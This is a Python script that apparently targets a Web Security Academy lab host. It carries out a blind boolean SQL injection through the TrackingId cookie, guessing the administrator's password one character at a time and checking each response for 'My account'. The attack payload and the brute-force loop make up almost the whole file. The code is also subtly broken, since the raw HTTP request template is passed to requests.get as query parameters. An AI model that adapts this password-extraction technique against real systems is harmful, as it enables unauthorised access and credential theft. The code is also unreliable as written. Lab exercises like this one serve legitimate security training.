import requests

req_template = """
GET /filter?category=Gifts HTTP/2
Host: 0a0f006f033d4da08289946a0011009e.web-security-academy.net
Cookie: TrackingId=XOTPq91YuSuQwAGp'+AND+(SELECT+SUBSTRING(password,%i,1)+FROM+users+WHERE+username='administrator')='%s; session=EP3AN4thiYRGe0o2AiRsruzAPgv7D1GV
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0f006f033d4da08289946a0011009e.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
"""

url = "https://0a0f006f033d4da08289946a0011009e.web-security-academy.net/"

grep = "My account"

for letter in "abcdefghijklmnopqrstuvwxyz0123456789":
    for number in range(1,21):
        req = req_template % (number, letter)
        r = requests.get(url,req)

        if grep in r.text:
            print(f"Found a match!, Number: {number}, Letter: {letter}")

        else:
            print(number,letter,r.status_code)